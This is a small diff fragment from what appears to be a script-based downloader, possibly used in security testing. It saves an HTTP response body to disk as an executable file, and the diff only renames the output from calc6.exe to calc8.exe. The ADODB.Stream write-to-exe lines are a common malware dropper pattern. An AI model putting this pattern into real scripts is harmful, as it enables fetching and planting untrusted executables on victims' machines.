@@ -14,7 +14,7 @@
 				ado.Type = adTypeBinary
 				ado.Open
 				ado.Write http.responseBody
-				ado.SaveToFile "C:\Users\31030\Desktop\tools\test\calc6.exe"
+				ado.SaveToFile "C:\Users\31030\Desktop\tools\test\calc8.exe"
 				ado.Close
 				]]>
 		</script>
